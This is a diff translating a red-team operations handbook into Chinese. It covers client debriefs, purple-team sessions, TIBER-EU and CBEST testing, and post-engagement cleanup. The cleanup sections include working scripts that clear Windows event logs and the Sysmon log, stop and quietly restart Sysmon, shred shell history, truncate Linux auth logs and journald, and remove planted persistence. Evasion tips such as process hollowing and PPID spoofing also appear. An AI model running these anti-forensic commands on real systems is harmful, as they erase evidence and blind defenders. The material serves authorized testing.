+    不用行话。批准预算的 CFO 必须听得懂并且感到警觉。
 
-  Section 2 (20 min): What we found
-    Walk the top 5 findings. One slide per finding.
-    Each slide: title, severity, plain-language impact, one screenshot.
-    Show the evidence. Screenshots of successful attacks land harder than descriptions.
+  第 2 部分（20 分钟）：我们发现了什么
+    讲前 5 项发现。每项发现一页幻灯片。
+    每页：标题、严重性、平实语言的影响、一张截图。
+    展示证据。成功攻击的截图比文字描述更有冲击力。
 
-  Section 3 (10 min): What worked on your side
-    Always find genuine positives. Every client does something right.
-    This section tells the client you are here to make them better, not embarrass them.
+  第 3 部分（10 分钟）：你们这边做对了什么
+    一定要找出真实的亮点。每个客户都有做对的地方。
+    这部分告诉客户：你来是为了让他们变得更好，不是让他们难堪。
 
-  Section 4 (10 min): What to fix first
-    THREE items only. Not fifteen.
-    If they leave knowing three things and do those three things: the engagement succeeds.
-    Give effort estimate and owner assignment for each.
+  第 4 部分（10 分钟）：先修什么
+    只讲三项。不是十五项。
+    如果他们离开时记住了三件事并真的做了这三件事：这次行动就成功了。
+    每一项都给出工作量估算和责任人。
 
-  Section 5 (30 min): Questions
-    Open floor. The security architect will ask something technical: have the detail.
-    The CISO will ask something political: be honest.
-    The CIO will ask about cost: have rough effort estimates.
+  第 5 部分（30 分钟）：提问
+    开放提问。安全架构师会问技术细节：要有细节。
+    CISO 会问政治层面的问题：要诚实。
+    CIO 会问成本：要有粗略的工作量估算。
     
-    The question you will always get: "How do we compare to other companies?"
-    Have an honest answer ready. Do not make up a percentile.
-    Share what you observe from your portfolio of engagements.
+    你总会遇到的问题：“我们和其他公司比怎么样？”
+    准备好一个诚实的答案。不要编一个百分位数。
+    分享你在自己的项目组合中观察到的情况。
 
-  Section 6 (10 min): Next steps
-    Confirm the re-test schedule (if included).
-    Confirm who owns each remediation item.
-    Confirm report delivery date if not already delivered.
+  第 6 部分（10 分钟）：下一步
+    确认复测时间表（若包含）。
+    确认每项修复的责任人。
+    确认报告交付日期（若尚未交付）。
 
-DEBRIEF DELIVERY RULES:
-  Never blame individuals (never name the person who gave up credentials)
-  No condescension (the client is not stupid: the adversary is sophisticated)
-  No minimizing ("it is not that bad") and no catastrophizing ("you are totally exposed")
-  Come with the remediation roadmap already drafted: save them work
-  Record the session (with permission): written notes miss context
+复盘交付规则：
+  绝不指责个人（绝不点名交出凭证的那个人）
+  不居高临下（客户不愚蠢：对手很老练）
+  不淡化（“没那么糟”），也不灾难化（“你们完全暴露了”）
+  带着已经起草好的修复路线图来：替他们省事
+  录下会议（经许可）：书面记录会漏掉语境
 
-DEBRIEF CHALLENGE QUESTIONS (prepare answers to these before the session):
-  "Would a real attacker have stopped where you stopped?"
-  "Is our SOC team actually bad, or was this an unusually skilled engagement?"
-  "If someone had been watching during the attack, what would they have seen?"
-  "How long would it have taken you if you had no prior knowledge of our environment?"
-  "Which finding, if fixed, would have prevented the most downstream damage?"
+复盘中的挑战性提问（会前准备好答案）：
+  “真正的攻击者会在你停下的地方停下吗？”
+  “是我们的 SOC 团队真的差，还是这次行动的水平异常高？”
+  “如果在攻击期间有人一直盯着看，他们会看到什么？”
+  “如果你对我们环境毫无预先了解，需要多久？”
+  “哪一项发现如果修好，能阻止最多后续损害？”
 ```
 
 ---
 
-### 4.5 PURPLE TEAM AND RE-TEST
+### 4.5 紫队与复测
 
 ```
-WHAT IS A PURPLE TEAM:
-  A collaborative session where the red team runs attacks while the blue team
-  (client SOC) watches in real time. Not adversarial: educational.
+什么是紫队：
+  一种协作式演练，红队执行攻击，蓝队（客户 SOC）实时观看。
+  不是对抗性的：是教学性的。
   
-  The blue team learns: what does our SIEM look like when this happens?
-  The red team learns: what does the blue team actually see?
+  蓝队学到：这件事发生时，我们的 SIEM 是什么样子？
+  红队学到：蓝队实际能看到什么？
 
-PURPLE TEAM SESSION FORMAT (4-8 hours):
-  For each TTP from the engagement:
-    1. Red team announces: "We are about to run Kerberoasting from a domain user context."
-    2. Blue team watches their SIEM/EDR.
-    3. Red team runs: GetUserSPNs.py, requests service tickets.
-    4. Blue team: "We see [alert fired / no alert]."
-    5. Discussion: if no alert, why not? What log source? What query?
-    6. Build the detection together. Document it.
+紫队演练形式（4-8 小时）：
+  对行动中的每个 TTP：
+    1. 红队宣布：“我们即将以域用户身份执行 Kerberoasting。”
+    2. 蓝队盯着他们的 SIEM/EDR。
+    3. 红队执行：GetUserSPNs.py，请求服务票据。
+    4. 蓝队：“我们看到 [告警触发 / 没有告警]。”
+    5. 讨论：如果没有告警，为什么？哪个日志源？什么查询？
+    6. 一起构建检测规则。记录下来。
 
-RE-TEST PROCESS (30-90 days after initial report):
-  Scope: original findings only.
+复测流程（初版报告后 30-90 天）：
+  范围：仅原始发现项。
   
-  For each finding: re-run the original attack technique.
+  对每项发现：重跑原始攻击技术。
   
-  Outcome: REMEDIATED (update to "Remediated": note the fix with evidence)
-  Outcome: PARTIALLY REMEDIATED (re-rate severity, usually lower: note what remains)
-  Outcome: NOT REMEDIATED (original status unchanged)
-  Outcome: REGRESSION (new related issue introduced: add as new finding)
+  结果：已修复（状态更新为“已修复”：附证据说明修复方式）
+  结果：部分修复（重新评级严重性，通常降低：说明残留问题）
+  结果：未修复（原状态不变）
+  结果：回归（引入了新的相关问题：作为新发现加入）
 
-  Deliverable: Re-test Summary Report (2-5 pages):
-    - All original findings with updated status
-    - Evidence for each remediated finding (screenshot confirming fix)
-    - Delta risk score: how much did posture improve?
-    - Any new findings discovered during re-test scope
+  交付物：复测总结报告（2-5 页）：
+    - 所有原始发现及更新后的状态
+    - 每项已修复发现的证据（确认修复的截图）
+    - 风险分值变化：安全态势改善了多少？
+    - 复测范围内新发现的任何问题
 
-RE-TEST SCOPE BOUNDARY:
-  If you discover a completely new critical vulnerability during a re-test:
-  pause immediately. Inform the client. Get written authorization before exploiting.
-  The re-test scope is not a blank check for new discovery.
-```
-
----
-
-### 4.6 THREAT-INTELLIGENCE-LED TESTING: TIBER-EU AND CBEST
-
-```
-WHAT THESE ARE:
-  TIBER-EU (Threat Intelligence-Based Ethical Red Teaming):
-    European Central Bank framework for testing financial sector organizations.
-    Mandated for major EU financial institutions under DORA (Digital Operational
-    Resilience Act, effective January 2025).
-    
-  CBEST:
-    UK equivalent, run under Bank of England oversight.
-    Required for UK systemically important financial institutions.
-
-WHY TOP OPERATORS NEED TO KNOW THESE:
-  If your clients include banks, insurance companies, payment processors, or
-  capital markets firms: you will encounter TIBER-EU or CBEST requirements.
-  Not knowing the framework is a disqualifier for those engagements.
-
-HOW TIBER-EU DIFFERS FROM A STANDARD RED TEAM:
-
-  Phase 1: Threat Intelligence (3-4 weeks BEFORE the red team begins)
-    A separate Threat Intelligence Provider (TIP) is engaged.
-    The TIP produces a Targeted Threat Intelligence (TTI) report:
-      - Which threat actors actively target this sector and geography?
-      - What are their known TTPs (MITRE ATT&CK mapped)?
-      - What specific assets (systems, data) would they target?
-    
-    Result: the red team attack is NOT generic: it replicates the TTPs of real,
-    identified threat actors that actually target this client's sector.
-
-  Phase 2: Red Team Test (8-12 weeks typical)
-    The red team executes ONLY the TTPs specified in the TTI report.
-    Attack paths are realistic: you are simulating APT-XYZ's actual methodology,
-    not just whatever works fastest.
-    
-    Scope is typically:
-      - Full external attack surface
-      - Social engineering
-      - Physical (if in scope)
-      - Internal network: post-compromise, crown jewel access simulation
-    
-    The "crown jewels" are defined in advance (with the TIP): specific systems
-    or data assets whose compromise would constitute the worst-case scenario.
-
-  Phase 3: Closure (2-4 weeks)
-    All three parties (client, TIP, red team) submit reports.
-    The regulator (ECB, Bank of England) reviews the TIBER output reports.
-    Findings and remediation plans are submitted to the regulator.
-
-TIBER-EU DOCUMENTATION REQUIREMENTS:
-  All standard red team documentation PLUS:
-  - Threat intelligence mapping: every attack technique mapped to a specific
-    threat actor TTP from the TTI report
-  - Chain of evidence: every action logged with precise timestamp
-  - Crown jewel reach: exact evidence of when/if crown jewels were reached
-  - Control effectiveness matrix: which defensive controls were observed to work
-
-HOW TO GET STARTED WITH TIBER-EU:
-  Read: "TIBER-EU Framework" document (ecb.europa.eu, free, 50 pages)
-  Read: "TIBER-EU Services Procurement Guidelines" (same source)
-  Get listed: national TIBER implementations maintain approved provider lists
-    (TIBER-NL, TIBER-DE, TIBER-BE: each country has its own registry)
-  First engagement: work as a subcontractor to an already-approved red team
-    firm on a TIBER engagement before leading one
-
-CBEST OVERVIEW:
-  Very similar to TIBER-EU but predates it.
-  Governed by: CBEST Intelligence-Led Testing Framework (Bank of England, 2016, updated 2022)
-  Provider categories: Intelligence Firm (equivalent to TIP) + Penetration Test Firm
-  Approval process: apply through CREST or Tigerscheme (CBEST-approved schemes)
-  Focus: UK banking and financial market infrastructure
-  
-  Key difference from TIBER: CBEST uses a more prescriptive testing methodology
-  document (the CBEST Test Plan) which specifies exact test scenarios.
-
-BOTH FRAMEWORKS REQUIRE:
-  - Formal scoping documentation beyond standard red team
-  - Threat intelligence integration (the test replicates real threat actors)
-  - Three-way reporting (client, red team, intel firm all submit separate reports)
-  - Regulatory submission and review
-  - Remediation planning submitted to the regulator
-  - Closure meeting with the regulator in some jurisdictions
-
-PRACTICAL IMPLICATION FOR YOUR REPORT:
-  In a TIBER or CBEST engagement: every finding must cite:
-    a. The threat actor TTP it replicates (from the TTI report)
-    b. The MITRE ATT&CK technique ID
-    c. The specific control (or absence of control) that was relevant
-    d. The recommended control improvement mapped to the threat actor's capability
-  
-  Generic finding descriptions ("Weak password policy found") are not acceptable.
-  Every finding must connect to the threat intelligence context.
+复测范围边界：
+  如果你在复测中发现一个全新的严重漏洞：
+  立刻暂停。通知客户。在利用之前取得书面授权。
+  复测范围不是新发现的空白支票。
 ```
 
 ---
 
-## SECTION 5: POST-ENGAGEMENT CLEANUP
+### 4.6 威胁情报驱动的测试：TIBER-EU 与 CBEST
 
-> You were there. Then you were not. That is the standard. A red team that leaves artifacts is a red team that creates an incident for the client's SOC and a liability for you. Complete cleanup is not optional: it is part of the deliverable.
+```
+这些是什么：
+  TIBER-EU（基于威胁情报的道德红队）：
+    欧洲央行用于测试金融部门组织的框架。
+    依据 DORA（数字运营韧性法案，2025 年 1 月生效）
+    对主要欧盟金融机构强制要求。
+    
+  CBEST：
+    英国的对等框架，由英格兰银行监督管理。
+    对英国系统重要性金融机构为强制要求。
+
+为什么顶尖操作员需要了解这些：
+  如果你的客户包括银行、保险公司、支付处理商或
+  资本市场机构：你会遇到 TIBER-EU 或 CBEST 要求。
+  不了解这些框架，就没资格接这类行动。
+
+TIBER-EU 与标准红队的区别：
+
+  阶段 1：威胁情报（红队开始前 3-4 周）
+    另聘一家威胁情报提供商（TIP）。
+    TIP 产出一份定向威胁情报（TTI）报告：
+      - 哪些威胁行为者正在积极针对该行业和地区？
+      - 他们已知的 TTP 是什么（映射到 MITRE ATT&CK）？
+      - 他们会针对哪些具体资产（系统、数据）？
+    
+    结果：红队攻击不是泛泛的：它复刻真实、已识别、
+    且确实针对该客户所在行业的威胁行为者的 TTP。
+
+  阶段 2：红队测试（通常 8-12 周）
+    红队只执行 TTI 报告中指定的 TTP。
+    攻击路径是现实主义的：你在模拟 APT-XYZ 的实际方法论，
+    而不只是什么方法最快。
+
+    范围通常包括：
+      - 完整外部攻击面
+      - 社会工程
+      - 物理（若在范围内）
+      - 内部网络：攻陷后、模拟触及核心资产
+    
+    “核心资产”事先（与 TIP 一起）界定：即那些被攻陷
+    就会构成最坏情形的具体系统或数据资产。
+
+  阶段 3：收尾（2-4 周）
+    三方（客户、TIP、红队）各自提交报告。
+    监管机构（欧洲央行、英格兰银行）审阅 TIBER 输出报告。
+    发现与修复计划提交给监管机构。
+
+TIBER-EU 文档要求：
+  所有标准红队文档之外，还需：
+  - 威胁情报映射：每项攻击技术都映射到 TTI 报告中某个
+    具体的威胁行为者 TTP
+  - 证据链：每项行动都以精确时间戳记录
+  - 核心资产触达：是否/何时触达核心资产的确切证据
+  - 控制有效性矩阵：观察到哪些防御控制确实生效
+
+如何开始做 TIBER-EU：
+  阅读：“TIBER-EU Framework”文档（ecb.europa.eu，免费，50 页）
+  阅读：“TIBER-EU Services Procurement Guidelines”（同一来源）
+  进入名录：各国 TIBER 实施机构维护获批提供商名单
+    （TIBER-NL、TIBER-DE、TIBER-BE：每个国家都有自己的登记册）
+  首次行动：先作为分包商，与已获批的红队公司一起做一次
+    TIBER 行动，然后再自己主导
+
+CBEST 概览：
+  与 TIBER-EU 非常相似，但出现更早。
+  由：CBEST 情报驱动测试框架（英格兰银行，2016 年，2022 年更新）管辖
+  提供商类别：情报公司（等同 TIP）+ 渗透测试公司
+  审批流程：通过 CREST 或 Tigerscheme（CBEST 认可的计划）申请
+  重点：英国银行业与金融市场基础设施
+  
+  与 TIBER 的关键区别：CBEST 使用更具规定性的测试方法论
+  文件（CBEST 测试计划），其中规定了确切的测试场景。
+
+两个框架都要求：
+  - 超出标准红队的正式范围界定文档
+  - 威胁情报整合（测试复刻真实威胁行为者）
+  - 三方报告（客户、红队、情报公司各自提交独立报告）
+  - 监管报送与审阅
+  - 提交给监管机构的修复计划
+  - 某些辖区需要与监管机构开收尾会
+
+对你的报告的实际含义：
+  在 TIBER 或 CBEST 行动中：每项发现都必须引用：
+    a. 它所复刻的威胁行为者 TTP（来自 TTI 报告）
+    b. MITRE ATT&CK 技术编号
+    c. 相关的具体控制（或控制的缺失）
+    d. 与威胁行为者能力相匹配的建议控制改进
+  
+  泛泛的发现描述（“发现弱密码策略”）不可接受。
+  每项发现都必须与威胁情报语境相连接。
+```
+
+---
+
+## 第 5 部分：行动后清理
+
+> 你在过那里。然后你不在那里了。这就是标准。留下痕迹的红队，会给客户的 SOC 制造事件，也会给你自己留下责任。彻底清理不是可选项：它是交付物的一部分。
 
 <div align="center">
 <table><tr><td>
@@ -3027,19 +3027,19 @@ PRACTICAL IMPLICATION FOR YOUR REPORT:
 
 ---
 
-### 5.1 DIGITAL FOOTPRINT REMOVAL
+### 5.1 数字足迹清除
 
-#### Windows Cleanup
+#### Windows 清理
 
 ```powershell
 # ===================================================================
-# WINDOWS POST-ENGAGEMENT CLEANUP SCRIPT
-# Run as: PowerShell -ExecutionPolicy Bypass -File cleanup_win.ps1
+# WINDOWS 行动后清理脚本
+# 运行方式：PowerShell -ExecutionPolicy Bypass -File cleanup_win.ps1
 # ===================================================================
 
-# Section 1: Remove Scheduled Tasks created during engagement
+# 第 1 节：删除行动期间创建的计划任务
 Write-Host "[*] Removing scheduled tasks ..."
-$TaskNames = @("WindowsUpdate", "SystemHealthCheck", "AdobeSync")  # your task names
+$TaskNames = @("WindowsUpdate", "SystemHealthCheck", "AdobeSync")  # 你的任务名
 foreach ($task in $TaskNames) {
     if (Get-ScheduledTask -TaskName $task -ErrorAction SilentlyContinue) {
         Unregister-ScheduledTask -TaskName $task -Confirm:$false
@@ -3047,9 +3047,9 @@ foreach ($task in $TaskNames) {
     }
 }
 
-# Section 2: Remove services created during engagement
+# 第 2 节：删除行动期间创建的服务
 Write-Host "[*] Removing services ..."
-$ServiceNames = @("SvcHostHelper", "WindowsTelemetry")  # your service names
+$ServiceNames = @("SvcHostHelper", "WindowsTelemetry")  # 你的服务名
 foreach ($svc in $ServiceNames) {
     if (Get-Service -Name $svc -ErrorAction SilentlyContinue) {
         Stop-Service -Name $svc -Force
@@ -3058,7 +3058,7 @@ foreach ($svc in $ServiceNames) {
     }
 }
 
-# Section 3: Remove registry persistence keys
+# 第 3 节：删除注册表持久化键
 Write-Host "[*] Cleaning registry persistence ..."
 $RegPaths = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
@@ -3066,7 +3066,7 @@ $RegPaths = @(
     "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
     "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows"
 )
-$OurValues = @("WindowsHelper", "SysUpdate")  # your value names
+$OurValues = @("WindowsHelper", "SysUpdate")  # 你的值名
 foreach ($path in $RegPaths) {
     foreach ($val in $OurValues) {
         if (Get-ItemProperty -Path $path -Name $val -ErrorAction SilentlyContinue) {
@@ -3076,7 +3076,7 @@ foreach ($path in $RegPaths) {
     }
 }
 
-# Section 4: Remove WMI event subscriptions (common persistence mechanism)
+# 第 4 节：删除 WMI 事件订阅（常见的持久化机制）
 Write-Host "[*] Removing WMI event subscriptions ..."
 Get-WMIObject -Namespace root/subscription -Class __EventFilter |
     Where-Object { $_.Name -like "*Update*" -or $_.Name -like "*Sync*" } |
@@ -3093,7 +3093,7 @@ Get-WMIObject -Namespace root/subscription -Class __EventConsumer |
 Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding |
     ForEach-Object { $_.Delete() } 2>$null
 
-# Section 5: Remove dropped files
+# 第 5 节：删除投放的文件
 Write-Host "[*] Removing dropped files ..."
 $OurFiles = @(
     "$env:TEMP\beacon.exe", "$env:TEMP\stager.ps1",
@@ -3107,23 +3107,23 @@ foreach ($f in $OurFiles) {
     }
 }
 
-# Section 6: Clear PowerShell history (ALL layers)
+# 第 6 节：清除 PowerShell 历史（所有层次）
 Write-Host "[*] Clearing PowerShell history ..."
-Clear-History  # In-session history
+Clear-History  # 会话内历史
 
 $PSHistPath = (Get-PSReadlineOption).HistorySavePath
 if ($PSHistPath -and (Test-Path $PSHistPath)) {
     Remove-Item -Path $PSHistPath -Force
     Write-Host "  [+] Removed PSReadLine history: $PSHistPath"
 }
-# Disable PSReadLine history going forward (this session):
+# 从此往后（本次会话）禁用 PSReadLine 历史：
 Set-PSReadLineOption -HistorySaveStyle SaveNothing
 
-# Section 7: Clear standard Windows Event Logs
+# 第 7 节：清除标准 Windows 事件日志
 Write-Host "[*] Clearing Windows Event Logs ..."
-# NOTE: See Section 5.4 (Log Clearing Decision Tree) before executing this section.
-# In a blind red team: clear logs. In a purple team or client-aware engagement:
-# discuss with the client first.
+# 注意：执行本节之前先看 5.4 节（日志清除决策树）。
+# 盲测红队：清日志。紫队或客户知情行动：
+# 先与客户讨论。
 $Logs = @("Security", "System", "Application", "PowerShell/Operational",
           "Microsoft-Windows-PowerShell/Operational",
           "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
@@ -3141,70 +3141,70 @@ Write-Host ""
 Write-Host "[*] Windows cleanup complete."
 ```
 
-#### Sysmon Artifact Cleanup (Critical Gap Most Teams Miss)
+#### Sysmon 痕迹清理（多数团队忽视的关键缺口）
 
 ```powershell
 # ===================================================================
-# SYSMON-SPECIFIC CLEANUP
-# Sysmon logs to: Microsoft-Windows-Sysmon/Operational
-# Standard wevtutil clear does NOT always clear Sysmon if it is
-# running as a protected service.
+# SYSMON 专项清理
+# Sysmon 日志位于：Microsoft-Windows-Sysmon/Operational
+# 如果 Sysmon 以受保护服务运行，标准 wevtutil 清除
+# 并不总能清掉它。
 #
-# Sysmon records: process creation (Event ID 1), network connections (3),
-# file creation (11), registry events (12-14), pipe events (17-18).
-# These survive a standard Security log clear and expose your TTPs.
+# Sysmon 记录：进程创建（事件 ID 1）、网络连接（3）、
+# 文件创建（11）、注册表事件（12-14）、管道事件（17-18）。
+# 这些在标准 Security 日志被清除后依然存在，会暴露你的 TTP。
 # ===================================================================
 
-# Check if Sysmon is running:
+# 检查 Sysmon 是否在运行：
 Get-Service | Where-Object { $_.DisplayName -like "*Sysmon*" }
 
-# Option A: Clear Sysmon log directly (requires local admin):
+# 方案 A：直接清除 Sysmon 日志（需要本地管理员）：
 wevtutil cl "Microsoft-Windows-Sysmon/Operational"
 
-# Option B: If Sysmon is running and log is protected (large organization):
-# Stop the Sysmon service first (requires SYSTEM or elevated admin):
+# 方案 B：若 Sysmon 在运行且日志受保护（大型组织）：
+# 先停止 Sysmon 服务（需要 SYSTEM 或提权管理员）：
 Stop-Service -Name Sysmon64 -Force 2>$null
 Stop-Service -Name Sysmon -Force   2>$null
 Start-Sleep -Seconds 3
 wevtutil cl "Microsoft-Windows-Sysmon/Operational"
-Start-Service -Name Sysmon64 2>$null  # Restart so blue team does not notice Sysmon stopped
+Start-Service -Name Sysmon64 2>$null  # 重启，以免蓝队发现 Sysmon 停了
 
-# Option C: If you cannot clear Sysmon (protected by tamper-resistant EDR):
-# The best option is to have run your operations in a way that produces
-# minimal Sysmon artifacts from the start:
-# - Use process hollowing or injection (parent PID spoofing reduces Event ID 1 correlation)
-# - Use network connections to CDN IP ranges (Event ID 3 is hard to triage at volume)
-# - Avoid writing files to disk: use in-memory execution where possible
+# 方案 C：若你无法清除 Sysmon（被防篡改 EDR 保护）：
+# 最好的选择是：从一开始就以产生最少 Sysmon 痕迹的
+# 方式行动：
+# - 使用进程镂空或注入（伪造父进程 PID 可减少事件 ID 1 的关联）
+# - 使用到 CDN IP 段的网络连接（事件 ID 3 在大量数据中很难研判）
+# - 避免写文件到磁盘：尽量使用内存中执行
 
-# Section 8: Clear Prefetch (records which executables ran):
+# 第 8 节：清除 Prefetch（记录哪些可执行文件运行过）：
 Write-Host "[*] Clearing Prefetch ..."
 Remove-Item -Path "C:\Windows\Prefetch\*" -Force -Recurse 2>$null
 
-# Section 9: Clear Windows Temp directories:
+# 第 9 节：清除 Windows Temp 目录：
 Remove-Item -Path "C:\Windows\Temp\*" -Force -Recurse 2>$null
 Remove-Item -Path "$env:TEMP\*" -Force -Recurse 2>$null
 
-# Section 10: Remove from Amcache.hve (records executed files):
-# Amcache cannot be deleted while Windows is running.
-# It is overwritten over time: this is the one artifact that requires
-# either offline deletion (boot from WinPE) or accepting that it will
-# age out. Document this limitation in your cleanup notes.
+# 第 10 节：从 Amcache.hve 中移除（记录已执行的文件）：
+# Windows 运行时无法删除 Amcache。
+# 它会随时间被覆盖：这是唯一需要
+# 离线删除（从 WinPE 启动）或接受其自然
+# 老化的痕迹。在你的清理笔记中记录这一局限。
 Write-Host "[!] Amcache.hve: cannot clear while running. Ages out naturally."
 Write-Host "[*] All other cleanup complete."
 ```
 
-#### Linux Cleanup
+#### Linux 清理
 
 ```bash
 #!/usr/bin/env bash
 # ===================================================================
-# LINUX POST-ENGAGEMENT CLEANUP SCRIPT
-# Run as: sudo bash cleanup_linux.sh
+# LINUX 行动后清理脚本
+# 运行方式：sudo bash cleanup_linux.sh
 # ===================================================================
 
 echo "[*] Starting Linux cleanup ..."
 
-# Section 1: Remove dropped files
+# 第 1 节：删除投放的文件
 echo "[*] Removing dropped files ..."
 OUR_FILES=(
     "/tmp/beacon"
@@ -3218,7 +3218,7 @@ for f in "${OUR_FILES[@]}"; do
     fi
 done
 
-# Section 2: Remove cron jobs
+# 第 2 节：删除 cron 任务
 echo "[*] Removing cron jobs ..."
 CRON_STRINGS=("beacon" "sysupdate" "ltbeacon")
 for str in "${CRON_STRINGS[@]}"; do
@@ -3228,7 +3228,7 @@ done
 find /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ -name "*update*" -o -name "*sys*" 2>/dev/null | \
     xargs rm -f
 
-# Section 3: Remove systemd services / units
+# 第 3 节：删除 systemd 服务 / 单元
 echo "[*] Removing systemd units ..."
 OUR_UNITS=("sysupdate.service" "networkhelper.service")
 for unit in "${OUR_UNITS[@]}"; do
@@ -3240,36 +3240,36 @@ for unit in "${OUR_UNITS[@]}"; do
 done
 systemctl daemon-reload
 
-# Section 4: Clear bash history (multiple layers)
+# 第 4 节：清除 bash 历史（多个层次）
 echo "[*] Clearing bash history ..."
-# Current session:
+# 当前会话：
 history -c && history -w
-# User history file:
+# 用户历史文件：
 shred -u ~/.bash_history 2>/dev/null; touch ~/.bash_history
-# Root history:
+# root 历史：
 shred -u /root/.bash_history 2>/dev/null; touch /root/.bash_history
-# Set HISTFILE to /dev/null for this session:
+# 本次会话把 HISTFILE 设为 /dev/null：
 export HISTFILE=/dev/null
 
-# Section 5: Clear syslog, auth.log, secure
+# 第 5 节：清除 syslog、auth.log、secure
 echo "[*] Clearing system logs ..."
-# NOTE: See Section 5.4 (Log Clearing Decision Tree) before executing.
+# 注意：执行前先看 5.4 节（日志清除决策树）。
 for log_file in /var/log/syslog /var/log/auth.log /var/log/secure \
                 /var/log/messages /var/log/kern.log \
                 /var/log/wtmp /var/log/btmp /var/log/lastlog; do
     if [ -f "$log_file" ]; then
-        : > "$log_file"   # Truncate to zero (preserves file descriptor)
+        : > "$log_file"   # 截断为零（保留文件描述符）
         echo "  [+] Truncated: $log_file"
     fi
 done
 
-# Clear journald logs:
+# 清除 journald 日志：
 journalctl --rotate 2>/dev/null
 journalctl --vacuum-time=1s 2>/dev/null
 
-# Section 6: Remove SSH authorized keys we added
+# 第 6 节：删除我们添加的 SSH 授权密钥
 echo "[*] Removing backdoor SSH keys ..."
-# Remove our public key from all users' authorized_keys:
+# 从所有用户的 authorized_keys 中删除我们的公钥：
 OUR_KEY_COMMENT="lt_implant_01"
 for home in /home/*/ /root/; do
     auth_file="$home/.ssh/authorized_keys"
@@ -3286,17 +3286,17 @@ echo "[*] Linux cleanup complete."
 
 ---
 
-### 5.2 ACTIVE DIRECTORY CLEANUP
+### 5.2 Active Directory 清理
 
 ```powershell
 # ===================================================================
-# ACTIVE DIRECTORY CLEANUP
-# Run from Domain Controller or domain admin context
+# ACTIVE DIRECTORY 清理
+# 从域控或域管理员上下文中运行
 # ===================================================================
 
 Import-Module ActiveDirectory
 
-# Section 1: Remove accounts we created
+# 第 1 节：删除我们创建的账户
 Write-Host "[*] Removing created accounts ..."
 $OurAccounts = @("svc_backup_red", "helpdesk.temp", "admin.support")
 foreach ($acct in $OurAccounts) {
@@ -3306,7 +3306,7 @@ foreach ($acct in $OurAccounts) {
     }
 }
 
-# Section 2: Remove groups we created
+# 第 2 节：删除我们创建的组
 $OurGroups = @("RedTeam_Temp", "IT_Support_Extended")
 foreach ($grp in $OurGroups) {
     if (Get-ADGroup -Filter { Name -eq $grp } -ErrorAction SilentlyContinue) {
@@ -3315,17 +3315,17 @@ foreach ($grp in $OurGroups) {
     }
 }
 
-# Section 3: Revert group memberships we changed
+# 第 3 节：回退我们变更过的组成员关系
 Write-Host "[*] Reverting group membership changes ..."
-# If we added ourselves to Domain Admins: remove
-# Note: use the actual group name in your target environment
+# 若我们把自身加入了 Domain Admins：移除
+# 注意：在你的目标环境中使用实际的组名
 # Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_backup_red" -Confirm:$false
 
-# Section 4: krbtgt password reset (if Golden Ticket was created)
-# ONLY execute if a Golden Ticket was actually created during the engagement.
-# The krbtgt account password must be reset TWICE with a gap of at least
-# 10 hours between resets (accounts for the maximum ticket lifetime of 10 hours
-# and the maximum tolerance for Kerberos clock skew).
+# 第 4 节：重置 krbtgt 密码（若创建过黄金票据）
+# 仅在行动中确实创建过黄金票据时才执行。
+# krbtgt 账户密码必须重置两次，两次之间至少间隔
+# 10 小时（对应票据最长生命周期 10 小时，
+# 以及 Kerberos 时钟偏移的最大容忍度）。
 Write-Host ""
 Write-Host "[!] GOLDEN TICKET CHECK:"
 Write-Host "    If a Golden Ticket was created: reset krbtgt password TWICE."
@@ -3341,7 +3341,7 @@ Write-Host "    If NO Golden Ticket was created: skip this step."
 Write-Host "    If unsure: check your engagement notes. Golden Ticket = mimikatz golden"
 Write-Host "    or impacket ticketer was run. If not: no reset needed."
 
-# Section 5: Remove GPOs we created
+# 第 5 节：删除我们创建的 GPO
 Write-Host "[*] Removing created GPOs ..."
 $OurGPOs = @("IT_Security_Policy_Temp", "RemoteAccess_Extended")
 foreach ($gpo in $OurGPOs) {
@@ -3351,8 +3351,8 @@ foreach ($gpo in $OurGPOs) {
     }
 }
 
-# Section 6: Remove AD CS certificate templates we modified (if ADCS attacks were performed)
-# See Section 7 (ADCS) for cleanup of modified certificate templates
+# 第 6 节：删除我们修改过的 AD CS 证书模板（若执行过 ADCS 攻击）
+# 修改过的证书模板的清理见第 7 部分（ADCS）
 Write-Host ""
 Write-Host "[*] AD cleanup complete."
 Write-Host "[!] Remember to:"
@@ -3363,166 +3363,166 @@ Write-Host "    - Confirm NTDS.dit dump artifacts are removed from DC disk"
 
 ---
 
-### 5.3 PHYSICAL CLEANUP CHECKLIST
+### 5.3 物理清理清单
 
 ```
-PHYSICAL CLEANUP (complete before leaving the engagement area):
+物理清理（离开行动区域前完成）：
 
-  LAN Turtle retrieval:
-    [ ] Return to deployment location using a fresh pretext
-        ("I think I left my phone charger in the conference room")
-    [ ] Remove the LAN Turtle from the switch port
-    [ ] Replace the original cable in the port
-    [ ] Confirm the phone/device that was plugged into it is reconnected
-    [ ] The switch port should look exactly as it did before you arrived
+  LAN Turtle 取回：
+    [ ] 编造新的托词返回部署地点
+        （“我想我把手机充电器落在会议室了”）
+    [ ] 从交换机端口取下 LAN Turtle
+    [ ] 把原来的线缆接回该端口
+    [ ] 确认原先插在它上面的电话/设备已重新接好
+    [ ] 交换机端口应与你到达前完全一致
 
-  Badge and credential materials:
-    [ ] Collect all cloned T5577 cards from all operators
-    [ ] Destroy (cut, shred): do not discard intact
-    [ ] Collect printed visual badge clones: shred
-    [ ] Delete cloned credential data from Flipper Zero and Proxmark3
+  证件与凭证材料：
+    [ ] 收回所有操作员手中的克隆 T5577 卡
+    [ ] 销毁（剪碎、粉碎）：不要完整丢弃
+    [ ] 收回打印的视觉证件克隆：粉碎
+    [ ] 从 Flipper Zero 和 Proxmark3 中删除克隆的凭证数据
 
-  Operator personal equipment:
-    [ ] Retrieve any USB drives, Rubber Duckys, USB imagers left on site
-    [ ] Retrieve any access tools (picks, bypass tools, UDT) from bags
-        in case security is alerted and bags are searched at exit
+  操作员个人装备：
+    [ ] 取回遗留现场的任何 U 盘、Rubber Ducky、USB 镜像器
+    [ ] 从包中取出任何开锁工具（撬钩、绕过工具、UDT），
+        以防安保被惊动、离开时被查包
 
-  Pretext materials:
-    [ ] Collect business cards distributed to targets: note how many unaccounted for
